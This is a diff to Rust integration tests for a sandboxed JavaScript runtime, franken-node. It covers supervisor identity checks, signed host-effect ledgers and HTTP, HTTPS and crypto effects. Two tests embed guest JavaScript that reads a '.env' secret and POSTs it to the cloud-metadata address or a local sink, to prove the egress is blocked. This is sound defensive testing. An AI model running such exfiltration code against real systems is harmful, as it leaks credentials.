@@ -1,9 +1,9 @@
 //! Integration tests for EngineDispatcher native-engine compatibility.
 //!
 //! Tests the complete native engine execution pipeline when the `engine`
-//! feature is enabled, plus subprocess edge cases with controlled fixture
-//! binaries when the test needs deterministic success, timeout, exit-code,
-//! or signal behavior.
+//! feature is enabled through the real `franken-node run` product supervisor,
+//! plus subprocess edge cases with controlled fixture binaries when the test
+//! needs deterministic success, timeout, exit-code, or signal behavior.
 //!
 //! Coverage includes:
 //! - Native engine execution with telemetry emission
@@ -13,6 +13,8 @@
 //! A fixture binary proves dispatcher/process handling only; it is not counted
 //! as evidence that a real franken_engine binary executed the application.
 
+#[cfg(feature = "engine")]
+use frankenengine_node::ops::engine_dispatcher::{HostEffectLedger, RunDispatchReport};
 use frankenengine_node::{
     config::{Config, NetworkAllowlistEntry, PreferredRuntime, Profile},
     ops::{
@@ -22,6 +24,8 @@ use frankenengine_node::{
     storage::frankensqlite_adapter::FrankensqliteAdapter,
 };
 use std::path::{Path, PathBuf};
+#[cfg(feature = "engine")]
+use std::process::{Command, ExitStatus, Stdio};
 use std::sync::{Arc, Mutex};
 use std::time::Duration;
 use tempfile::TempDir;
@@ -31,6 +35,171 @@ fn balanced_config() -> Config {
         profile: Profile::Balanced,
         ..Config::default()
     }
+}
+
+#[cfg(feature = "engine")]
+fn franken_node_bin() -> &'static str {
+    env!("CARGO_BIN_EXE_franken-node")
+}
+
+#[cfg(feature = "engine")]
+struct ProductSupervisorOutput {
+    status: ExitStatus,
+    stdout: String,
+    stderr: String,
+}
+
+#[cfg(feature = "engine")]
+#[derive(serde::Deserialize)]
+struct ProductRunFailureEvidence {
+    schema_version: String,
+    host_effect_ledger: HostEffectLedger,
+}
+
+/// Execute a native run through the same product-binary supervisor used in
+/// production, then recover the public dispatch report from `run --json`.
+///
+/// Cargo integration-test executables are different images from the sibling
+/// product binary. They therefore must not directly supervise its private
+/// native-session worker: Linux correctly rejects that topology at the
+/// `/proc/<parent>/exe == /proc/self/exe` boundary. Launching the public CLI
+/// preserves that invariant without an environment bypass, alternate trust
+/// root, or mock engine. The CLI process remains the worker's exact parent and
+/// launches its own `/proc/self/exe`, just as an operator run does.
+///
+/// This helper proves only the product CLI -> native worker execution path. It
+/// does not authorize arbitrary library embedders or different executables.
+#[cfg(feature = "engine")]
+fn invoke_product_supervisor(
+    app_path: &Path,
+    config: &Config,
+    policy_mode: &str,
+    engine_path: &Path,
+) -> Result<ProductSupervisorOutput, String> {
+    let working_dir = app_path
+        .parent()
+        .ok_or_else(|| format!("application path has no parent: {}", app_path.display()))?;
+    let relative_app = app_path.strip_prefix(working_dir).map_err(|error| {
+        format!(
+            "application {} was not beneath its working directory {}: {error}",
+            app_path.display(),
+            working_dir.display()
+        )
+    })?;
+
+    // Direct EngineDispatcher calls do not run full CLI config validation.
+    // Populate only the two first-run security prerequisites that `init` would
+    // synthesize. Neither field grants guest capabilities or native-worker
+    // authority; the worker trust boundary remains the kernel-authenticated
+    // same-executable parent channel.
+    let mut cli_config = config.clone();
+    let _synthesis = cli_config.synthesize_init_security_defaults();
+    let config_name = "bd-8gpux-franken-node.toml";
+    std::fs::write(
+        working_dir.join(config_name),
+        cli_config
+            .to_toml()
+            .map_err(|error| format!("serialize product test config: {error}"))?,
+    )
+    .map_err(|error| format!("write product test config: {error}"))?;
+
+    let output = Command::new(franken_node_bin())
+        .arg("run")
+        .arg(relative_app)
+        .arg("--policy")
+        .arg(policy_mode)
+        .arg("--config")
+        .arg(config_name)
+        .arg("--runtime")
+        .arg("franken-engine")
+        .arg("--engine-bin")
+        .arg(engine_path)
+        .arg("--json")
+        .current_dir(working_dir)
+        .stdin(Stdio::null())
+        .output()
+        .map_err(|error| format!("launch product native supervisor: {error}"))?;
+
+    Ok(ProductSupervisorOutput {
+        status: output.status,
+        stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
+        stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
+    })
+}
+
+#[cfg(feature = "engine")]
+fn dispatch_via_product_supervisor(
+    app_path: &Path,
+    config: &Config,
+    policy_mode: &str,
+    engine_path: &Path,
+) -> Result<RunDispatchReport, String> {
+    let output = invoke_product_supervisor(app_path, config, policy_mode, engine_path)?;
+    if !output.status.success() {
+        return Err(format!(
+            "product run failed (status={:?}): stdout={:?}; stderr={:?}",
+            output.status.code(),
+            output.stdout,
+            output.stderr
+        ));
+    }
+    parse_product_dispatch(&output)
+}
+
+#[cfg(feature = "engine")]
+fn parse_product_dispatch(output: &ProductSupervisorOutput) -> Result<RunDispatchReport, String> {
+    let envelope: serde_json::Value = serde_json::from_str(&output.stdout).map_err(|error| {
+        format!(
+            "product run returned no completion JSON (status={:?}): {error}; stdout={:?}; stderr={:?}",
+            output.status.code(),
+            output.stdout,
+            output.stderr
+        )
+    })?;
+    let dispatch = envelope.get("dispatch").cloned().ok_or_else(|| {
+        format!(
+            "product run returned JSON without a dispatch report (status={:?}): stdout={:?}; stderr={:?}",
+            output.status.code(), output.stdout, output.stderr
+        )
+    })?;
+    serde_json::from_value(dispatch).map_err(|error| {
+        format!(
+            "product dispatch report was invalid (status={:?}): {error}; stdout={:?}; stderr={:?}",
+            output.status.code(),
+            output.stdout,
+            output.stderr
+        )
+    })
+}
+
+#[cfg(feature = "engine")]
+fn failure_evidence_via_product_supervisor(
+    app_path: &Path,
+    config: &Config,
+    policy_mode: &str,
+    engine_path: &Path,
+) -> Result<ProductRunFailureEvidence, String> {
+    let output = invoke_product_supervisor(app_path, config, policy_mode, engine_path)?;
+    if output.status.success() {
+        return Err(format!(
+            "product run unexpectedly succeeded: stdout={:?}; stderr={:?}",
+            output.stdout, output.stderr
+        ));
+    }
+    let evidence: ProductRunFailureEvidence =
+        serde_json::from_str(&output.stdout).map_err(|error| {
+            format!(
+                "product run returned invalid failure evidence (status={:?}): {error}; stdout={:?}; stderr={:?}",
+                output.status.code(), output.stdout, output.stderr
+            )
+        })?;
+    if evidence.schema_version != "franken-node/run-failure-effect-evidence/v1" {
+        return Err(format!(
+            "product run returned unexpected failure evidence schema {:?}; stderr={:?}",
+            evidence.schema_version, output.stderr
+        ));
+    }
+    Ok(evidence)
 }
 
 /// Create a test application file with simple JavaScript content
@@ -186,6 +355,52 @@ fn create_crashing_fixture_engine_binary(dir: &Path) -> PathBuf {
     return batch_path;
 }
 
+/// bd-8gpux: a Cargo integration-test executable is not authorized to become
+/// the direct supervisor of the sibling product worker. Even though the test
+/// can construct a complete nonce-bound private request through the public
+/// dispatcher, Linux must reject the different parent executable before guest
+/// JavaScript runs. Positive native cases below go through the real product CLI
+/// instead of weakening this boundary.
+#[cfg(all(feature = "engine", target_os = "linux"))]
+#[test]
+fn direct_different_executable_native_supervisor_fails_closed_bd_8gpux() {
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    let marker_path = temp_dir.path().join("different-supervisor-ran.marker");
+    let marker_literal = serde_json::to_string(&marker_path)
+        .expect("temporary marker path must serialize as a JavaScript string literal");
+    let app_path = create_test_app(
+        temp_dir.path(),
+        "different-supervisor.js",
+        &format!("require('fs').writeFileSync({marker_literal}, 'ran');\n"),
+    );
+    let config = Config {
+        profile: Profile::LegacyRisky,
+        ..Config::default()
+    };
+    let fixture_engine = create_fixture_engine_binary(temp_dir.path());
+    let product_worker = PathBuf::from(franken_node_bin());
+    assert!(
+        product_worker.is_absolute(),
+        "Cargo must expose an absolute product binary path"
+    );
+
+    let dispatcher = EngineDispatcher::new(Some(fixture_engine), PreferredRuntime::FrankenEngine)
+        .with_native_session_worker_path(product_worker);
+    let error = dispatcher
+        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+        .expect_err("a different executable must not supervise the product worker")
+        .to_string();
+
+    assert!(
+        error.contains("ordinary native-session control peer executable did not match this worker"),
+        "different-executable rejection must remain exact and actionable: {error}"
+    );
+    assert!(
+        !marker_path.exists(),
+        "worker identity rejection must happen before guest JavaScript executes"
+    );
+}
+
 #[test]
 #[cfg(feature = "engine")]
 fn test_native_engine_execution_with_telemetry() {
@@ -200,33 +415,29 @@ fn test_native_engine_execution_with_telemetry() {
 
     // bd-rpo4f: pin an explicit fixture engine placeholder so the dispatch
     // resolution gate passes deterministically on every host. With the
-    // `engine` feature, execution is native and in-process — the placeholder
-    // is never spawned; it only satisfies the availability check, which can
-    // never resolve from candidates because no `franken-engine` binary is
-    // shipped anywhere (bd-zi9hj). Previously `None` made this test
-    // host-dependent (and unreachable: the suite died at the first
-    // unavailable-resolution exit(127) before this test reported).
+    // `engine` feature, execution occurs in the product's private native worker
+    // and the placeholder is never spawned; it only satisfies the availability
+    // check, which can never resolve from candidates because no standalone
+    // `franken-engine` binary is shipped anywhere (bd-zi9hj).
     let fixture_engine = create_fixture_engine_binary(temp_dir.path());
-    let dispatcher = EngineDispatcher::new(Some(fixture_engine), PreferredRuntime::FrankenEngine);
     // Create test telemetry bridge
     let socket_path = temp_dir.path().join("test-telemetry.sock");
     let adapter = Arc::new(Mutex::new(FrankensqliteAdapter::default()));
     let _telemetry_bridge = TelemetryBridge::new(&socket_path.to_string_lossy(), adapter);
     let policy_mode = config.profile.to_string();
 
-    // Execute through native engine
-    let result = dispatcher.dispatch_run(&app_path, &config, &policy_mode, &[], 0);
-
-    // Verify successful execution
-    assert!(
-        result.is_ok(),
-        "Native engine execution should succeed, got: {:?}",
-        result
-    );
-
-    let report = result.unwrap();
+    // Execute through the real product supervisor and its same-image worker.
+    // The balanced-profile sentinel deliberately challenges this otherwise
+    // completed run, so the public CLI exits with the report's containment
+    // code after emitting the full completion envelope.
+    let output = invoke_product_supervisor(&app_path, &config, &policy_mode, &fixture_engine)
+        .expect("native product supervisor should return a completion envelope");
+    assert_eq!(output.status.code(), Some(91));
+    let report = parse_product_dispatch(&output)
+        .expect("challenged native run should still emit a valid dispatch report");
     assert_eq!(report.runtime, "franken_engine");
     assert!(!report.used_fallback_runtime);
+    assert_eq!(report.exit_code, Some(91));
     assert!(report.telemetry.is_some(), "Telemetry should be present");
 
     // Verify telemetry was emitted
@@ -242,7 +453,7 @@ fn test_native_engine_execution_with_telemetry() {
 }
 
 /// bd-5r99w.12 (mock-free e2e, product apex): a real, idiomatic JS program that
-/// performs fs effects, run through the PUBLIC `dispatch_run` path, surfaces a
+/// performs fs effects, run through the PUBLIC `run --json` path, surfaces a
 /// signed, SDK-verifiable host-effect ledger in `run --json` — and the bytes
 /// really hit the sandbox. No mocks: real parser/lowering, real `SandboxedHostIo`
 /// performing genuine fs I/O, real `EffectReceipt` hash chain, real verifier SDK
@@ -268,13 +479,11 @@ fn run_surfaces_signed_host_effect_ledger_bd_5r99w_12() {
 
     // A dummy engine binary in a separate directory only satisfies dispatch-plan
     // resolution (the path must exist). With the `engine` feature, execution runs
-    // IN-PROCESS via the native path and never executes this binary, so the
-    // sandbox (the app dir) stays clean and the run is hermetic.
+    // in the product's private native worker and never executes this binary, so
+    // the sandbox (the app dir) stays clean and the run is hermetic.
     let engine_dir = TempDir::new().expect("Failed to create engine dir");
     let engine_path = create_fixture_engine_binary(engine_dir.path());
-    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
-    let report = dispatcher
-        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
         .expect("native run with host effects should succeed");
 
     assert_eq!(report.runtime, "franken_engine");
@@ -328,6 +537,93 @@ fn run_surfaces_signed_host_effect_ledger_bd_5r99w_12() {
         .expect("verifier SDK re-derives the effect chain offline");
     assert_eq!(verdict.effect_count, 2);
     assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
+}
+
+/// bd-opsnv: execute the exact committed crypto entropy corpus fixtures through
+/// the public product supervisor and its same-image native worker. The output
+/// assertions pin the Node-observable contract, while the SDK-verifiable
+/// ledger proves each fixture performed its non-empty entropy work through the
+/// typed RandomRead boundary instead of a deterministic interpreter fallback.
+#[test]
+#[cfg(feature = "engine")]
+fn crypto_entropy_corpus_fixtures_use_signed_random_read_effects_bd_opsnv() {
+    let fixture_root =
+        Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/compat_corpus/crypto");
+    let cases = [
+        ("0022_crypto_randombytes.js", "true\n16\n0\n", 1_usize),
+        ("0024_crypto_randomuuid.js", "string\n36\ntrue\n", 1_usize),
+        ("0025_crypto_randomuuid.js", "true\ntrue\n", 1_usize),
+        ("0026_crypto_randomint.js", "true\ntrue\n", 1_usize),
+        ("0027_crypto_randomint.js", "true\n3\n", 2_usize),
+        ("0028_crypto_randomfillsync.js", "true\n8\n", 1_usize),
+    ];
+
+    let config = Config {
+        profile: Profile::LegacyRisky,
+        ..Config::default()
+    };
+    let engine_dir = TempDir::new().expect("Failed to create engine dir");
+    let engine_path = create_fixture_engine_binary(engine_dir.path());
+
+    for (fixture_name, expected_stdout, minimum_effects) in cases {
+        let source = std::fs::read_to_string(fixture_root.join(fixture_name))
+            .unwrap_or_else(|error| panic!("read committed fixture {fixture_name}: {error}"));
+        let run_dir = TempDir::new().expect("Failed to create crypto fixture run dir");
+        let app_path = create_test_app(run_dir.path(), fixture_name, &source);
+        let report =
+            dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
+                .unwrap_or_else(|error| panic!("product run failed for {fixture_name}: {error}"));
+
+        assert_eq!(report.runtime, "franken_engine");
+        assert!(
+            !report.used_fallback_runtime,
+            "crypto fixture must execute in the native runtime: {fixture_name}"
+        );
+        assert_eq!(
+            report.exit_code,
+            Some(0),
+            "product fixture must exit successfully: {fixture_name}"
+        );
+        assert_eq!(
+            report.captured_output.stdout, expected_stdout,
+            "product output diverged from the committed Node contract: {fixture_name}"
+        );
+        assert!(
+            report.captured_output.stderr.is_empty(),
+            "product fixture emitted unexpected guest stderr: {fixture_name}: {:?}",
+            report.captured_output.stderr
+        );
+        let ledger = report.host_effect_ledger.as_ref().unwrap_or_else(|| {
+            panic!("native product run omitted its effect ledger: {fixture_name}")
+        });
+        assert!(
+            ledger.effect_count >= minimum_effects,
+            "fixture {fixture_name} recorded too few RandomRead effects: {:?}",
+            ledger.entries
+        );
+        assert_eq!(ledger.allowed_count, ledger.effect_count);
+        assert_eq!(ledger.denied_count, 0);
+        assert!(
+            ledger
+                .entries
+                .iter()
+                .all(|entry| entry.receipt.effect_kind.label() == "random_read"),
+            "fixture {fixture_name} emitted a non-RandomRead effect: {:?}",
+            ledger.entries
+        );
+
+        let entries_json =
+            serde_json::to_string(&ledger.entries).expect("serialize entropy ledger entries");
+        let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
+            serde_json::from_str(&entries_json)
+                .expect("verifier SDK accepts the entropy ledger wire shape");
+        let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-opsnv-corpus-e2e");
+        let verdict = sdk
+            .verify_effect_chain_entries(&sdk_entries)
+            .unwrap_or_else(|error| panic!("SDK rejected {fixture_name} ledger: {error}"));
+        assert_eq!(verdict.effect_count, ledger.effect_count);
+        assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
+    }
 }
 
 /// bd-656a2 / bd-3894s (http leg, mock-free e2e close-out): a real, idiomatic JS
@@ -403,9 +699,7 @@ fn run_surfaces_signed_http_request_effect_ledger_bd_656a2() {
 
     let engine_dir = TempDir::new().expect("Failed to create engine dir");
     let engine_path = create_fixture_engine_binary(engine_dir.path());
-    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
-    let report = dispatcher
-        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
         .expect("native run with an allowlisted http egress should succeed");
 
     assert_eq!(report.runtime, "franken_engine");
@@ -465,7 +759,7 @@ fn run_surfaces_signed_http_request_effect_ledger_bd_656a2() {
 
 /// bd-3894s slice (5) (https leg, mock-free e2e — real TLS): a real JS program
 /// performing `require('https').get('https://127.0.0.1:PORT/')` runs through the
-/// PUBLIC `dispatch_run` path against a REAL rustls TLS listener on loopback.
+/// PUBLIC `run --json` path against a REAL rustls TLS listener on loopback.
 /// The engine's wire builder marks the effect `use_tls` (https scheme), the
 /// SSRF gate authorizes the allowlisted endpoint, and the network mechanism
 /// performs the round trip inside a genuine TLS session: the listener only
@@ -554,9 +848,7 @@ fn run_surfaces_signed_https_request_effect_ledger_bd_3894s() {
 
     let engine_dir = TempDir::new().expect("Failed to create engine dir");
     let engine_path = create_fixture_engine_binary(engine_dir.path());
-    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
-    let report = dispatcher
-        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
         .expect("native run with an allowlisted https egress should succeed");
 
     assert_eq!(report.runtime, "franken_engine");
@@ -684,9 +976,7 @@ fn run_https_untrusted_anchor_fails_closed_bd_3894s() {
 
     let engine_dir = TempDir::new().expect("Failed to create engine dir");
     let engine_path = create_fixture_engine_binary(engine_dir.path());
-    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
-    let report = dispatcher
-        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
         .expect("the run completes; the failed TLS effect is recorded, not fatal");
 
     assert_eq!(report.runtime, "franken_engine");
@@ -725,7 +1015,7 @@ fn run_https_untrusted_anchor_fails_closed_bd_3894s() {
 /// real JS program that builds an HTTP request body INCREMENTALLY via the writable
 /// `ClientRequest` stream —
 /// `const req = http.request(url, { method: 'POST', ... }); req.write(a);
-/// req.write(b); req.end(c);` — run through the PUBLIC `dispatch_run` path. The
+/// req.write(b); req.end(c);` — run through the PUBLIC `run --json` path. The
 /// `http.request` call lowers to the engine's `net:client_request` HostCall (it
 /// builds the ClientRequest object WITHOUT egressing); the egress fires only on
 /// `req.end()`, carrying the body ACCUMULATED across the `write`/`end` calls. The
@@ -791,9 +1081,7 @@ fn run_surfaces_signed_http_request_write_end_body_ledger_bd_3894s() {
 
     let engine_dir = TempDir::new().expect("Failed to create engine dir");
     let engine_path = create_fixture_engine_binary(engine_dir.path());
-    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
-    let report = dispatcher
-        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
         .expect("native run with an allowlisted http.request write/end egress should succeed");
 
     assert_eq!(report.runtime, "franken_engine");
@@ -875,8 +1163,8 @@ fn run_blocks_secret_egress_and_proves_non_exfiltration_bd_plhag() {
     // The guest reads the secret then POSTs it to the cloud-metadata endpoint.
     let source = "const fs = require('fs');\n\
          const secret = fs.readFileSync('.env', 'utf8');\n\
-         const http = require('http');\n\
-         const req = http.request('http://169.254.169.254/exfil', { method: 'POST' });\n\
+         const req = require('http').request('http://169.254.169.254/exfil', { method: 'POST' });\n\
+         req.on('error', () => {});\n\
          req.end(secret);\n";
     let app_path = create_test_app(temp_dir.path(), "app.js", source);
 
@@ -889,15 +1177,12 @@ fn run_blocks_secret_egress_and_proves_non_exfiltration_bd_plhag() {
     };
     let engine_dir = TempDir::new().expect("Failed to create engine dir");
     let engine_path = create_fixture_engine_binary(engine_dir.path());
-    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
-    let report = dispatcher
-        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
-        .expect("native run with a denied secret egress should still complete");
-
+    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
+        .expect("handled policy denial must complete with signed effect evidence");
     let ledger = report
         .host_effect_ledger
         .as_ref()
-        .expect("native run must surface a host-effect ledger");
+        .expect("handled denied secret egress must surface its effect ledger");
     let secret_commitment = secret_file_label_set_commitment();
 
     // The sensitive read is labeled (a source), but a read is not a sink.
@@ -905,7 +1190,7 @@ fn run_blocks_secret_egress_and_proves_non_exfiltration_bd_plhag() {
         .entries
         .iter()
         .find(|e| e.receipt.effect_kind.label() == "fs_read")
-        .expect("an fs_read receipt for the .env read");
+        .unwrap_or_else(|| panic!("ledger omitted the .env fs_read receipt: {ledger:#?}"));
     assert_eq!(
         read.receipt.label_set_commitment, secret_commitment,
         "the secret-file read must carry the secret label commitment"
@@ -917,7 +1202,7 @@ fn run_blocks_secret_egress_and_proves_non_exfiltration_bd_plhag() {
         .entries
         .iter()
         .find(|e| e.receipt.effect_kind.label() == "http_request")
-        .expect("an http_request receipt for the egress");
+        .unwrap_or_else(|| panic!("ledger omitted the denied http_request: {ledger:#?}"));
     assert!(
         matches!(
             egress.receipt.policy_outcome,
@@ -995,8 +1280,8 @@ fn run_blocks_secret_egress_to_allowed_sink_bd_n1bym() {
     let source = format!(
         "const fs = require('fs');\n\
          const secret = fs.readFileSync('.env', 'utf8');\n\
-         const http = require('http');\n\
-         const req = http.request('http://{addr}/collect', {{ method: 'POST' }});\n\
+         const req = require('http').request('http://{addr}/collect', {{ method: 'POST' }});\n\
+         req.on('error', () => {{}});\n\
          req.end(secret);\n"
     );
     let app_path = create_test_app(temp_dir.path(), "app.js", &source);
@@ -1018,10 +1303,8 @@ fn run_blocks_secret_egress_to_allowed_sink_bd_n1bym() {
 
     let engine_dir = TempDir::new().expect("Failed to create engine dir");
     let engine_path = create_fixture_engine_binary(engine_dir.path());
-    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
-    let report = dispatcher
-        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
-        .expect("native run with a flow-blocked secret egress should still complete");
+    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
+        .expect("handled flow denial must complete with signed effect evidence");
 
     // Physical proof the secret never left: no connection reached the sink.
     match listener.accept() {
@@ -1034,13 +1317,13 @@ fn run_blocks_secret_egress_to_allowed_sink_bd_n1bym() {
     let ledger = report
         .host_effect_ledger
         .as_ref()
-        .expect("host-effect ledger");
+        .expect("handled flow-blocked egress must surface its effect ledger");
     let secret_commitment = secret_file_label_set_commitment();
     let egress = ledger
         .entries
         .iter()
         .find(|e| e.receipt.effect_kind.label() == "http_request")
-        .expect("an http_request receipt for the egress");
+        .unwrap_or_else(|| panic!("ledger omitted the flow-blocked http_request: {ledger:#?}"));
     assert!(
         matches!(
             egress.receipt.policy_outcome,
@@ -1083,7 +1366,7 @@ fn run_blocks_secret_egress_to_allowed_sink_bd_n1bym() {
 
 /// bd-3894s slice (2c) (http leg, mock-free e2e — response callback delivery): a
 /// real, idiomatic JS program that uses the Node response-callback form —
-/// `http.get(url, (res) => { ... })` — run through the PUBLIC `dispatch_run` path.
+/// `http.get(url, (res) => { ... })` — run through the PUBLIC `run --json` path.
 /// The `http.get` egress fires synchronously and the response callback is delivered
 /// `cb(res)` on the next event-loop turn (the engine drains the macrotask queue
 /// after the program's synchronous portion). The callback EXECUTING with the REAL
@@ -1154,9 +1437,7 @@ fn run_surfaces_signed_http_get_response_callback_ledger_bd_3894s() {
 
     let engine_dir = TempDir::new().expect("Failed to create engine dir");
     let engine_path = create_fixture_engine_binary(engine_dir.path());
-    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
-    let report = dispatcher
-        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
         .expect("native run with an http.get response callback should succeed");
 
     assert_eq!(report.runtime, "franken_engine");
@@ -1221,7 +1502,7 @@ fn run_surfaces_signed_http_get_response_callback_ledger_bd_3894s() {
 /// EVENT model): a real, idiomatic JS program that consumes the response through the
 /// Node readable-stream events — `res.on('data', chunk => …)` then `res.on('end',
 /// () => …)` — registered INSIDE the `http.get(url, (res) => { … })` response
-/// callback, run through the PUBLIC `dispatch_run` path. This is the proof the event
+/// callback, run through the PUBLIC `run --json` path. This is the proof the event
 /// model is real end to end:
 ///   - `http.get(url, cb)` lowers to `net:request` carrying the trailing closure; the
 ///     engine delivers `cb(res)` on the next event-loop turn (slice 2c);
@@ -1298,9 +1579,7 @@ fn run_surfaces_signed_http_get_response_event_stream_ledger_bd_3894s() {
 
     let engine_dir = TempDir::new().expect("Failed to create engine dir");
     let engine_path = create_fixture_engine_binary(engine_dir.path());
-    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
-    let report = dispatcher
-        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+    let report = dispatch_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
         .expect("native run with http response stream events should succeed");
 
     assert_eq!(report.runtime, "franken_engine");
@@ -1366,11 +1645,11 @@ fn run_surfaces_signed_http_get_response_event_stream_ledger_bd_3894s() {
 /// bd-656a2 / bd-3894s (http leg, mock-free e2e — DENIED half): the fail-closed
 /// counterpart of the allowed e2e. A real `require('http').get('http://127.0.0.1:9/')`
 /// program — a loopback endpoint the default-deny SSRF policy blocks, with no
-/// config allowlist — run through the PUBLIC `dispatch_run` path is gated BEFORE
+/// config allowlist — run through the PUBLIC `run --json` path is gated BEFORE
 /// the socket opens. The denial is surfaced as a signed DENIED `http_request`
-/// EffectReceipt in the run --json host-effect ledger (proof that nothing reached
-/// the network), the run still completes (the denial is not a fatal fault), and
-/// the verifier SDK re-derives the chain offline.
+/// EffectReceipt in the run --json failure ledger (proof that nothing reached
+/// the network), the run fails closed, and the verifier SDK re-derives the chain
+/// offline.
 ///
 /// Together with the allowed-half test this is the close-out conjunction for the
 /// bd-656a2 http producer: the http.request L1 subject is proof-carrying on BOTH
@@ -1400,19 +1679,10 @@ fn run_surfaces_denied_http_request_effect_ledger_bd_656a2() {
 
     let engine_dir = TempDir::new().expect("Failed to create engine dir");
     let engine_path = create_fixture_engine_binary(engine_dir.path());
-    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
-    // The denied egress must NOT abort the run: dispatch_run still succeeds and
-    // surfaces the ledger with a fail-closed denied receipt.
-    let report = dispatcher
-        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
-        .expect("a policy-denied http egress must not fail the run");
-
-    assert_eq!(report.runtime, "franken_engine");
-
-    let ledger = report
-        .host_effect_ledger
-        .as_ref()
-        .expect("native http run must surface a host-effect ledger even on denial");
+    let evidence =
+        failure_evidence_via_product_supervisor(&app_path, &config, "legacy-risky", &engine_path)
+            .expect("policy-denied http egress must fail closed with signed effect evidence");
+    let ledger = &evidence.host_effect_ledger;
     assert_eq!(
         ledger.effect_count, 1,
         "the blocked egress must still produce one (denied) effect, got {:?}",
@@ -1445,10 +1715,10 @@ fn run_surfaces_denied_http_request_effect_ledger_bd_656a2() {
     );
 
     // run --json surfaces the denied receipt.
-    let json = serde_json::to_string(&report).expect("serialize run report as run --json");
+    let json = serde_json::to_string(ledger).expect("serialize failure ledger as run --json");
     assert!(
-        json.contains("\"host_effect_ledger\"") && json.contains("\"denied\""),
-        "run --json must include the denied host-effect ledger entry"
+        json.contains("\"http_request\"") && json.contains("\"denied\""),
+        "the failure ledger must serialize its denied http_request entry: {json}"
     );
 
     // The verifier SDK re-derives the chain offline — denied receipts are part of
@@ -1566,14 +1836,14 @@ fn test_native_engine_error_handling_propagation() {
     // the whole suite). The --engine-bin hint takes precedence over env,
     // config, and candidates, so host state cannot leak in.
     let fixture_engine = create_fixture_engine_binary(temp_dir.path());
-    let dispatcher = EngineDispatcher::new(Some(fixture_engine), PreferredRuntime::FrankenEngine);
     // Create test telemetry bridge
     let socket_path = temp_dir.path().join("test-telemetry.sock");
     let adapter = Arc::new(Mutex::new(FrankensqliteAdapter::default()));
     let _telemetry_bridge = TelemetryBridge::new(&socket_path.to_string_lossy(), adapter);
     let policy_mode = config.profile.to_string();
 
-    let result = dispatcher.dispatch_run(&nonexistent_path, &config, &policy_mode, &[], 0);
+    let result =
+        dispatch_via_product_supervisor(&nonexistent_path, &config, &policy_mode, &fixture_engine);
 
     assert!(result.is_err(), "Should fail for nonexistent source file");
 
@@ -1593,7 +1863,8 @@ fn test_native_engine_error_handling_propagation() {
         r#"this is not valid javascript syntax !@#$%"#,
     );
 
-    let result = dispatcher.dispatch_run(&invalid_app_path, &config, &policy_mode, &[], 0);
+    let result =
+        dispatch_via_product_supervisor(&invalid_app_path, &config, &policy_mode, &fixture_engine);
 
     // Engine may or may not reject invalid syntax - depends on implementation
     // The key is that errors should propagate properly, not crash
@@ -1611,7 +1882,7 @@ fn test_native_engine_error_handling_propagation() {
 /// bd-rpo4f follow-through, same disease as the bd-4f4f0 exit-code sibling
 /// below: the external-process dispatch path for the FrankenEngine plan only
 /// exists WITHOUT the `engine` feature — with it, execution is native and
-/// in-process, the slow fixture binary is never spawned, and a fast
+/// isolated in a private worker, the slow fixture binary is never spawned, and a fast
 /// `console.log` app completes instantly, so `result.is_err()` can never
 /// hold. This failure was invisible until bd-rpo4f removed the in-library
 /// exit(127) that aborted the suite before this test reported.
